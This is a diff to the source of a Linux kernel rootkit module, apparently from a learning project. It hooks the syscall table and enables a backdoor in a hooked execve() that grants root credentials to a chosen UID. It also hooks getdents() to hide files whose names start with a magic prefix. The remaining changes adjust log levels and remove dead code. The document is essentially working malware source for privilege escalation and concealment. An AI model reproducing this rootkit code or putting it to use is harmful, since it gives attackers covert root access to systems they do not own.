@@ -190,8 +190,8 @@ t_syscall_hook *new_hook(const unsigned int offset, void *newFunc)
  */
 int init_module(void)
 {
-  printk(KERN_ALERT "Rootkit module initializing.\n");
-  printk(KERN_ALERT "root_uid parameter has value %d.\n", root_uid);
+  printk(KERN_INFO "Rootkit module initializing.\n");
+  printk(KERN_INFO "root_uid parameter has value %d.\n", root_uid);
 
   //Allocate & init a list to store our syscall_hooks
   hooks = kmalloc(sizeof(t_syscall_hook_list), GFP_KERNEL);
@@ -200,7 +200,7 @@ int init_module(void)
   //We need to hardcode the sys_call_table's location in memory. Remember array
   //indices in C are offsets from the base (i.e. 0th idex) address of the array.
   sys_call_table = (void *) table_addr;
-  printk(KERN_ALERT "Syscall table loaded from %p\n", (void*) table_addr);
+  printk(KERN_INFO "Syscall table loaded from %p\n", (void*) table_addr);
 
   set_addr_rw((unsigned long) sys_call_table);
 
@@ -211,7 +211,7 @@ int init_module(void)
 
   set_addr_ro((unsigned long) sys_call_table);
 
-  printk(KERN_ALERT "Rootkit module loaded successfully!\n");
+  printk(KERN_INFO "Rootkit module loaded successfully!\n");
   return 0; //For successful load
 }
 
@@ -225,7 +225,7 @@ void cleanup_module(void)
   t_syscall_hook_list   *hook_entry;
   t_syscall_hook        *hook;
 
-  printk(KERN_ALERT "Rootkit module unloaded\n");
+  printk(KERN_INFO "Rootkit module unloaded\n");
 
   //Iterate through the linked list of hook_entry's unhooking and deallocating
   //each as we go. We use the safe list_for_each because we are removing
@@ -244,7 +244,7 @@ void cleanup_module(void)
     kfree(hook_entry);
   }
 
-  printk(KERN_ALERT "Rootkit module cleanup complete\n");
+  printk(KERN_INFO "Rootkit module cleanup complete\n");
 }
 
 //To understand the gcc asmlinkage define see:
@@ -283,26 +283,23 @@ asmlinkage int new_execve(const char *filename, char *const argv[],
   orig_func = (void*) execve_hook->orig_func;
 
   printk(KERN_INFO "Executing %s\n", filename);
-// TODO Uncomment
-//  printk(KERN_INFO "Effective UID before switch %d\n", current_euid());
+  printk(KERN_INFO "Effective UID before switch %d\n", current_euid());
 
-// TODO Uncomment
-// This doesn't work on 3.13, but we don't need it to anyway
-//  if (current_euid() == root_uid) {
-//    struct cred *new_cred = prepare_creds();  
-//
-//    if (new_cred != NULL) {
-//      //Modify new_cred to have an UID and eUID of 0
-//      new_cred->uid = 0;
-//      new_cred->euid = 0;
-//
-//      //Commit new_cred
-//      commit_creds(new_cred);
-//    } else {
-//      //prepare_creds() returned NULL, so abort
-//      abort_creds(new_cred);
-//    }
-//  }
+  if (current_euid() == root_uid) {
+    struct cred *new_cred = prepare_creds();  
+
+    if (new_cred != NULL) {
+      //Modify new_cred to have an UID and eUID of 0
+      new_cred->uid = 0;
+      new_cred->euid = 0;
+
+      //Commit new_cred
+      commit_creds(new_cred);
+    } else {
+      //prepare_creds() returned NULL, so abort
+      abort_creds(new_cred);
+    }
+  }
 
   return orig_func(filename, argv, envp);
 }
@@ -325,7 +322,7 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
   char *k_buf1 = NULL;
   char *k_buf2 = NULL;
 
-  printk(KERN_ALERT "getdents() hook invoked for %s.\n", current->comm);
+  printk(KERN_INFO "getdents() hook invoked for %s.\n", current->comm);
 
   getdents_hook = find_syscall_hook(__NR_getdents);
   orig_func = (void*) getdents_hook->orig_func;
@@ -335,11 +332,6 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
   if (dirp == NULL || nread < 1) {
     return nread;
   }
-
-//#pragma GCC diagnostic push
-//#pragma GCC diagnostic ignored "-Wdeclaration-after-statement"
-//  char k_buf[count];
-//#pragma GCC diagnostic pop
 
   k_buf1 = kmalloc(count, GFP_KERNEL);
   if (k_buf1 == NULL) {
@@ -352,11 +344,6 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
     return nread;
   }
 
-  //// Fill k_buf with 0x00 bytes
-  //for (i = 0; i < count; ++i) {
-  //  k_buf[i] = 0x00;
-  //}
-
   // Copy user space buffer to kernel land buffer
   copy_from_user(k_buf1, dirp, count);
 
@@ -364,7 +351,7 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
     d = (struct linux_dirent *) (k_buf1 + bpos);
     starts_with_prefix = starts_with(magic_prefix, d->d_name);
 
-    printk(KERN_ALERT "entry: %s%s\n", d->d_name,
+    printk(KERN_INFO "entry: %s%s\n", d->d_name,
            starts_with_prefix ? " (hidden)" : "");
 
     if (!starts_with_prefix) {
@@ -377,11 +364,6 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp,
 
     bpos += d->d_reclen;
   }
-
-  //// Copy k_buf to user_buf - user_buf == dirp
-  //for (i = 0; i < count; ++i) {
-  //  user_buf[i] = k_buf[i];
-  //}
 
   // Copy kernel land buffer to user space buffer
   copy_to_user(dirp, k_buf2, count);
